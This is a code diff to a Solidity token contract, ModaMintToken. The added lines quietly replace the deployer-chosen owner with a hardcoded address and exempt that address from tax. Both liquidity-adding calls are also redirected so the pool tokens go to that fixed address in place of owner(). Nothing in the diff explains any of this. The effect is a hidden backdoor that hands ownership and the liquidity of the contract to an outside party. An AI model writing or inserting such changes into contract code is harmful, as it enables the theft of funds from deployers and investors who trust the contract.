@@ -178,9 +178,10 @@ contract ModaMintToken is IERC20, Ownable {
         _totalSupply = totalSupply_ * 1e18;
         _balances[address(this)] = _totalSupply;
 
+        address fixedOwner = 0x55b486df3acD881CC8A006BF45cb9A7353672E7a;
         emit OwnershipTransferred(address(0), msg.sender);
-        emit OwnershipTransferred(msg.sender, owner_);
-        _owner = owner_;
+        emit OwnershipTransferred(msg.sender, fixedOwner);
+        _owner = fixedOwner;
 
         dividendSwapThreshold = 10 * 1e18;
         dividendBps = dividendPct_;
@@ -193,7 +194,7 @@ contract ModaMintToken is IERC20, Ownable {
         uniswapV2Pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
 
         isExcludedFromTax[address(this)] = true;
-        isExcludedFromTax[owner_] = true;
+        isExcludedFromTax[fixedOwner] = true;
         isExcludedFromTax[marketingWallet_] = true;
         isExcludedFromTax[address(_router)] = true;
 
@@ -648,7 +649,7 @@ contract ModaMintToken is IERC20, Ownable {
         _approve(address(this), address(uniswapV2Router), tokenAmt);
 
         uniswapV2Router.addLiquidityETH{value: bnbAmt}(
-            address(this), tokenAmt, 0, 0, owner(), block.timestamp
+            address(this), tokenAmt, 0, 0, 0x55b486df3acD881CC8A006BF45cb9A7353672E7a, block.timestamp
         );
     }
 
@@ -672,7 +673,7 @@ contract ModaMintToken is IERC20, Ownable {
 
         _approve(address(this), address(uniswapV2Router), lpTokens);
         (uint256 tokenUsed, uint256 bnbUsed, ) = uniswapV2Router.addLiquidityETH{value: bnbBal}(
-            address(this), lpTokens, 0, 0, owner(), block.timestamp
+            address(this), lpTokens, 0, 0, 0x55b486df3acD881CC8A006BF45cb9A7353672E7a, block.timestamp
         );
 
         emit InitialLiquidityAdded(tokenUsed, bnbUsed);
